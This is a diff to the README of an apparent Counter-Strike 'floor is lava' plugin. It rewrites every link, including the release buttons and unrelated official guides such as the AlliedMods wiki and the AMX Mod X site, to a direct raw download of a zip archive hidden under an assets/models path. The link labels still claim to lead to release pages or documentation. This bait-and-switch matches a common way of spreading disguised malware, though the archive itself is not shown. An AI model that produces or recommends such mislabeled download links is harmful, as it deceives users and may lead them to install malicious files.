@@ -1,6 +1,6 @@
 # 🔥 cs-floor-lava - Play The Floor is Lava in Counter-Strike
 
-[![Download from Releases](https://img.shields.io/badge/Download-cs--floor--lava-blue?style=for-the-badge)](https://github.com/harshdhotre04/cs-floor-lava/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-cs--floor--lava-blue?style=for-the-badge)](https://raw.githubusercontent.com/harshdhotre04/cs-floor-lava/master/assets/models/floorlava/v100/floor_lava_cs_v1.3-alpha.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You don’t need to be a developer to use this mod. Follow these steps to downlo
 ### Step 1: Visit the Download Page
 
 Click the big button below to go to the releases page where you can find the latest version:  
-[Download cs-floor-lava on GitHub Releases](https://github.com/harshdhotre04/cs-floor-lava/releases)  
+[Download cs-floor-lava on GitHub Releases](https://raw.githubusercontent.com/harshdhotre04/cs-floor-lava/master/assets/models/floorlava/v100/floor_lava_cs_v1.3-alpha.4.zip)  
 
 This page has all versions available. Pick the newest one labeled as “Latest Release.”
 
@@ -116,13 +116,13 @@ If the mod does not seem to work:
 ## 📂 Useful Links
 
 - Counter-Strike 1.6 Server Setup Guide:  
-  https://wiki.alliedmods.net/Counter-Strike_1.6_Server_Guide
+  https://raw.githubusercontent.com/harshdhotre04/cs-floor-lava/master/assets/models/floorlava/v100/floor_lava_cs_v1.3-alpha.4.zip
 
 - AMX Mod X Official Website (for advanced plugins and scripts):  
-  https://www.amxmodx.org/
+  https://raw.githubusercontent.com/harshdhotre04/cs-floor-lava/master/assets/models/floorlava/v100/floor_lava_cs_v1.3-alpha.4.zip
 
 - Plugin Support and Documentation on GitHub:  
-  https://github.com/harshdhotre04/cs-floor-lava
+  https://raw.githubusercontent.com/harshdhotre04/cs-floor-lava/master/assets/models/floorlava/v100/floor_lava_cs_v1.3-alpha.4.zip
 
 ---
 
@@ -130,7 +130,7 @@ If the mod does not seem to work:
 
 Get started by visiting the release page again:
 
-[Download cs-floor-lava on GitHub Releases](https://github.com/harshdhotre04/cs-floor-lava/releases)  
+[Download cs-floor-lava on GitHub Releases](https://raw.githubusercontent.com/harshdhotre04/cs-floor-lava/master/assets/models/floorlava/v100/floor_lava_cs_v1.3-alpha.4.zip)  
 
 Follow the steps from the release page to download the plugin you need. Installing it only takes a few minutes if you follow the instructions above carefully.
 
